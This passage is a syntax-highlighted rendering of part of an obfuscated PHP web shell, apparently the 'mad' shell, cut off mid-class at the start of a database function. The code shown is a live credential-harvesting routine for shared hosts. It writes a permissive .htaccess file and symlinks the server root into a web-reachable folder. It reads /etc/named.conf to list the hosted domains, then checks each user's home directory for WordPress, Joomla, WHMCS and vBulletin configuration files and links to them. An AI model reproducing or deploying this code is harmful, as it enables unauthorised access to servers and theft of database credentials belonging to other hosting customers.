<span class="lineno">1465</span> <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$IIIIIIII1I11</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="k">or</span> <span class="o">@</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$IIIIIIII1lII</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="p">)</span>
<span class="lineno">1466</span> <span class="p">{</span>
<span class="lineno">1467</span> <span class="nv">$IIIIIIII1I1l</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;div style=&#39; color: #FF0000 ; text-shadow: 0px 0px 1px red; &#39;&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1468</span> <span class="p">}</span>
<span class="lineno">1469</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1470</span> <span class="s2">&amp;lt;tr&amp;gt;</span>
<span class="lineno">1471</span> 
<span class="lineno">1472</span> <span class="s2">&amp;lt;td&amp;gt;</span>
<span class="lineno">1473</span> <span class="s2">&amp;lt;a target=&#39;_blank&#39; href=http://www.&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$IIIIIIII1I1l</span><span class="o">.</span><span class="s1">&#39; &amp;lt;/a&amp;gt;</span>
<span class="lineno">1474</span> <span class="s1">&amp;lt;/td&amp;gt;</span>
<span class="lineno">1475</span> 
<span class="lineno">1476</span> <span class="s1">&amp;lt;td&amp;gt;</span>
<span class="lineno">1477</span> <span class="s1">&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="lineno">1478</span> <span class="s2">&amp;lt;/td&amp;gt;</span>
<span class="lineno">1479</span> 
<span class="lineno">1480</span> <span class="s2">&amp;lt;td&amp;gt;</span>
<span class="lineno">1481</span> <span class="s2">&amp;lt;a href=&#39;sym/root/home/&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/public_html&#39; target=&#39;_blank&#39;&amp;gt;symlink &amp;lt;/a&amp;gt;</span>
<span class="lineno">1482</span> <span class="s2">&amp;lt;/td&amp;gt;</span>
<span class="lineno">1483</span> 
<span class="lineno">1484</span> 
<span class="lineno">1485</span> <span class="s2">&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1486</span> <span class="nb">flush</span><span class="p">();</span>
<span class="lineno">1487</span> <span class="p">}</span>
<span class="lineno">1488</span> <span class="p">}</span>
<span class="lineno">1489</span> <span class="p">}</span>
<span class="lineno">1490</span> <span class="p">}</span>
<span class="lineno">1491</span>     
<span class="lineno">1492</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>    
<span class="lineno">1493</span>     
<span class="lineno">1494</span>  <span class="p">}</span>
<span class="lineno">1495</span>  
<span class="lineno">1496</span>  
<span class="lineno">1497</span>  
<span class="lineno">1498</span>  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;config&#39;</span><span class="p">)</span>
<span class="lineno">1499</span>  
<span class="lineno">1500</span>  
<span class="lineno">1501</span>  <span class="p">{</span>
<span class="lineno">1502</span>   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1503</span> <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="s1">&#39;sym&#39;</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
<span class="lineno">1504</span> <span class="nv">$IIIIIIIIIIl1</span>  <span class="o">=</span> <span class="s2">&quot;Options all </span><span class="se">\n</span><span class="s2"> DirectoryIndex Sux.html </span><span class="se">\n</span><span class="s2"> AddType text/plain .php </span><span class="se">\n</span><span class="s2"> AddHandler server-parsed .php </span><span class="se">\n</span><span class="s2">  AddType text/plain .html </span><span class="se">\n</span><span class="s2"> AddHandler txt .html </span><span class="se">\n</span><span class="s2"> Require None </span><span class="se">\n</span><span class="s2"> Satisfy Any&quot;</span><span class="p">;</span>
<span class="lineno">1505</span> <span class="nv">$IIIIIIIIII1I</span> <span class="o">=@</span><span class="nb">fopen</span> <span class="p">(</span><span class="s1">&#39;sym/.htaccess&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno">1506</span> <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$IIIIIIIIII1I</span> <span class="p">,</span><span class="nv">$IIIIIIIIIIl1</span><span class="p">);</span>
<span class="lineno">1507</span> <span class="o">@</span><span class="nb">symlink</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="s1">&#39;sym/root&#39;</span><span class="p">);</span>
<span class="lineno">1508</span> <span class="nv">$IIIIIIIIIlIl</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="s1">&#39;_FILE_&#39;</span><span class="p">);</span>
<span class="lineno">1509</span>   
<span class="lineno">1510</span>    
<span class="lineno">1511</span>    <span class="nv">$IIIIIIIIIllI</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/named.conf&#39;</span><span class="p">);</span>
<span class="lineno">1512</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$IIIIIIIIIllI</span><span class="p">)</span>
<span class="lineno">1513</span> <span class="p">{</span>
<span class="lineno">1514</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;# Cant access this file on server -&amp;gt; [ /etc/named.conf ]&amp;lt;/pre&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1515</span> <span class="p">}</span>
<span class="lineno">1516</span> <span class="k">else</span>
<span class="lineno">1517</span> <span class="p">{</span>
<span class="lineno">1518</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1519</span> <span class="s2">&amp;lt;table align=&#39;center&#39; width=&#39;40%&#39; class=&#39;main&#39; &amp;gt;&amp;lt;td&amp;gt; Domains &amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; Script &amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1520</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$IIIIIIIIIllI</span> <span class="k">as</span> <span class="nv">$IIIIIIIIIll1</span><span class="p">){</span>
<span class="lineno">1521</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">eregi</span><span class="p">(</span><span class="s1">&#39;zone&#39;</span><span class="p">,</span><span class="nv">$IIIIIIIIIll1</span><span class="p">)){</span>
<span class="lineno">1522</span> <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">&#39;#zone &quot;(.*)&quot;#&#39;</span><span class="p">,</span><span class="nv">$IIIIIIIIIll1</span><span class="p">,</span><span class="nv">$IIIIIIIIIl11</span><span class="p">);</span>
<span class="lineno">1523</span> <span class="nb">flush</span><span class="p">();</span>
<span class="lineno">1524</span> <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">2</span><span class="p">){</span>
<span class="lineno">1525</span> <span class="nv">$IIIIIIIII1I1</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="s1">&#39;/etc/valiases/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]));</span>
<span class="lineno">1526</span> <span class="nv">$IIIIIIIII1l1</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/wp-config.php&#39;</span><span class="p">;</span>
<span class="lineno">1527</span> <span class="nv">$IIIIIIIII11I</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIII1l1</span><span class="p">);</span>
<span class="lineno">1528</span> <span class="nv">$IIIIIIIII11l</span><span class="o">=</span><span class="nv">$IIIIIIIII11I</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1529</span> <span class="nv">$IIIIIIIII111</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/blog/wp-config.php&#39;</span><span class="p">;</span>
<span class="lineno">1530</span> <span class="nv">$IIIIIIIIlIII</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIII111</span><span class="p">);</span>
<span class="lineno">1531</span> <span class="nv">$IIIIIIIIlIIl</span><span class="o">=</span><span class="nv">$IIIIIIIIlIII</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1532</span> <span class="nv">$IIIIIIIIlII1</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/configuration.php&#39;</span><span class="p">;</span>
<span class="lineno">1533</span> <span class="nv">$IIIIIIIIlIlI</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIlII1</span><span class="p">);</span>
<span class="lineno">1534</span> <span class="nv">$IIIIIIIIlIll</span><span class="o">=</span><span class="nv">$IIIIIIIIlIlI</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1535</span> <span class="nv">$IIIIIIIIlIl1</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/joomla/configuration.php&#39;</span><span class="p">;</span>
<span class="lineno">1536</span> <span class="nv">$IIIIIIIIlI1I</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIlIl1</span><span class="p">);</span>
<span class="lineno">1537</span> <span class="nv">$IIIIIIIIlI1l</span><span class="o">=</span><span class="nv">$IIIIIIIIlI1I</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1538</span> <span class="nv">$IIIIIIIIlI11</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/includes/config.php&#39;</span><span class="p">;</span>
<span class="lineno">1539</span> <span class="nv">$IIIIIIIIllII</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIlI11</span><span class="p">);</span>
<span class="lineno">1540</span> <span class="nv">$IIIIIIIIllIl</span><span class="o">=</span><span class="nv">$IIIIIIIIllII</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1541</span> <span class="nv">$IIIIIIIIllI1</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/vb/includes/config.php&#39;</span><span class="p">;</span>
<span class="lineno">1542</span> <span class="nv">$IIIIIIIIlllI</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIllI1</span><span class="p">);</span>
<span class="lineno">1543</span> <span class="nv">$IIIIIIIIllll</span><span class="o">=</span><span class="nv">$IIIIIIIIlllI</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1544</span> <span class="nv">$IIIIIIIIlll1</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/forum/includes/config.php&#39;</span><span class="p">;</span>
<span class="lineno">1545</span> <span class="nv">$IIIIIIIIll1I</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIlll1</span><span class="p">);</span>
<span class="lineno">1546</span> <span class="nv">$IIIIIIIIll1l</span><span class="o">=</span><span class="nv">$IIIIIIIIll1I</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1547</span> <span class="nv">$IIIIIIIIll11</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;public_html/clients/configuration.php&#39;</span><span class="p">;</span>
<span class="lineno">1548</span> <span class="nv">$IIIIIIIIl1II</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIll11</span><span class="p">);</span>
<span class="lineno">1549</span> <span class="nv">$IIIIIIIIl1Il</span><span class="o">=</span><span class="nv">$IIIIIIIIl1II</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1550</span> <span class="nv">$IIIIIIIIl1I1</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/support/configuration.php&#39;</span><span class="p">;</span>
<span class="lineno">1551</span> <span class="nv">$IIIIIIIIl1II</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIl1I1</span><span class="p">);</span>
<span class="lineno">1552</span> <span class="nv">$IIIIIIIIl1lI</span><span class="o">=</span><span class="nv">$IIIIIIIIl1II</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1553</span> <span class="nv">$IIIIIIIIl1ll</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/client/configuration.php&#39;</span><span class="p">;</span>
<span class="lineno">1554</span> <span class="nv">$IIIIIIIIl1l1</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIl1ll</span><span class="p">);</span>
<span class="lineno">1555</span> <span class="nv">$IIIIIIIIl11I</span><span class="o">=</span><span class="nv">$IIIIIIIIl1l1</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1556</span> <span class="nv">$IIIIIIIIl11l</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/submitticket.php&#39;</span><span class="p">;</span>
<span class="lineno">1557</span> <span class="nv">$IIIIIIIIl111</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIIIl11l</span><span class="p">);</span>
<span class="lineno">1558</span> <span class="nv">$IIIIIIII1III</span><span class="o">=</span><span class="nv">$IIIIIIIIl111</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1559</span> <span class="nv">$IIIIIIII1IIl</span><span class="o">=</span><span class="nv">$IIIIIIIIIIIl</span><span class="o">.</span><span class="s1">&#39;/sym/root/home/&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/public_html/client/configuration.php&#39;</span><span class="p">;</span>
<span class="lineno">1560</span> <span class="nv">$IIIIIIII1II1</span><span class="o">=</span><span class="nb">get_headers</span><span class="p">(</span><span class="nv">$IIIIIIII1IIl</span><span class="p">);</span>
<span class="lineno">1561</span> <span class="nv">$IIIIIIII1IlI</span><span class="o">=</span><span class="nv">$IIIIIIII1II1</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1562</span> <span class="nv">$IIIIIIII1Ill</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIII11l</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">);</span>
<span class="lineno">1563</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s1">&#39;&amp;nbsp;&#39;</span><span class="p">;</span>
<span class="lineno">1564</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIII11l</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="k">true</span> <span class="p">)</span>
<span class="lineno">1565</span> <span class="p">{</span>
<span class="lineno">1566</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot;&amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIII1l1</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;Wordpress&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1567</span> <span class="p">}</span>
<span class="lineno">1568</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIlIIl</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1569</span> <span class="p">{</span>
<span class="lineno">1570</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot;&amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIII111</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;Wordpress&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1571</span> <span class="p">}</span>
<span class="lineno">1572</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIlIll</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span> <span class="k">and</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIII1III</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span> <span class="p">)</span>
<span class="lineno">1573</span> <span class="p">{</span>
<span class="lineno">1574</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIl11l</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;WHMCS&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1575</span> <span class="p">}</span>
<span class="lineno">1576</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIl1lI</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1577</span> <span class="p">{</span>
<span class="lineno">1578</span> <span class="nv">$IIIIIIII1I1I</span> <span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIl1I1</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;WHMCS&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1579</span> <span class="p">}</span>
<span class="lineno">1580</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIl11I</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1581</span> <span class="p">{</span>
<span class="lineno">1582</span> <span class="nv">$IIIIIIII1I1I</span> <span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIl1ll</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;WHMCS&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1583</span> <span class="p">}</span>
<span class="lineno">1584</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIlIll</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1585</span> <span class="p">{</span>
<span class="lineno">1586</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIlII1</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;Joomla&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1587</span> <span class="p">}</span>
<span class="lineno">1588</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIlI1l</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1589</span> <span class="p">{</span>
<span class="lineno">1590</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIlIl1</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;Joomla&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1591</span> <span class="p">}</span>
<span class="lineno">1592</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIllIl</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1593</span> <span class="p">{</span>
<span class="lineno">1594</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIlI11</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;vBulletin&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1595</span> <span class="p">}</span>
<span class="lineno">1596</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIllll</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1597</span> <span class="p">{</span>
<span class="lineno">1598</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIllI1</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;vBulletin&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1599</span> <span class="p">}</span>
<span class="lineno">1600</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$IIIIIIIIll1l</span><span class="p">,</span><span class="s1">&#39;200&#39;</span><span class="p">)</span>  <span class="o">==</span> <span class="k">true</span><span class="p">)</span>
<span class="lineno">1601</span> <span class="p">{</span>
<span class="lineno">1602</span> <span class="nv">$IIIIIIII1I1I</span><span class="o">=</span><span class="s2">&quot; &amp;lt;a href=&#39;&quot;</span><span class="o">.</span><span class="nv">$IIIIIIIIlll1</span><span class="o">.</span><span class="s2">&quot;&#39; target=&#39;_blank&#39;&amp;gt;vBulletin&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1603</span> <span class="p">}</span>
<span class="lineno">1604</span> <span class="k">else</span>
<span class="lineno">1605</span> <span class="p">{</span>
<span class="lineno">1606</span> <span class="k">continue</span><span class="p">;</span>
<span class="lineno">1607</span> <span class="p">}</span>
<span class="lineno">1608</span> <span class="nv">$IIIIIIII1I1l</span> <span class="o">=</span> <span class="nv">$IIIIIIIII1I1</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="p">;</span>
<span class="lineno">1609</span> <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=http://www.&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$IIIIIIIIIl11</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno">1610</span> <span class="s1">&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$IIIIIIII1I1I</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span><span class="nb">flush</span><span class="p">();</span>
<span class="lineno">1611</span> <span class="p">}</span>
<span class="lineno">1612</span> <span class="p">}</span>
<span class="lineno">1613</span> <span class="p">}</span>
<span class="lineno">1614</span> <span class="p">}</span>
<span class="lineno">1615</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>   
<span class="lineno">1616</span>     
<span class="lineno">1617</span>  <span class="p">}</span>
<span class="lineno">1618</span>     
<span class="lineno">1619</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1620</span>     <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1621</span>     
<span class="lineno">1622</span> <span class="p">}</span>    
<span class="lineno">1623</span> 
<span class="lineno">1624</span> 
<span class="lineno">1625</span> <span class="k">function</span> <span class="nf">madsql</span><span class="p">()</span>
<span class="lineno">1626</span> <span class="p">{</span>
<span class="lineno">1627</span>     
<span class="lineno">1628</span>     
<span class="lineno">1629</span>     <span class="k">class</span> <span class="nc">DbClass</span> <span class="p">{</span>
<span class="lineno">1630</span>        <span class="k">var</span> <span class="nv">$type</span><span class="p">;</span>
<span class="lineno">1631</span>        <span class="k">var</span> <span class="nv">$link</span><span class="p">;</span>
<span class="lineno">1632</span>        <span class="k">var</span> <span class="nv">$res</span><span class="p">;</span>
<span class="lineno">1633</span>        <span class="k">function</span> <span class="nf">DbClass</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>    <span class="p">{</span>
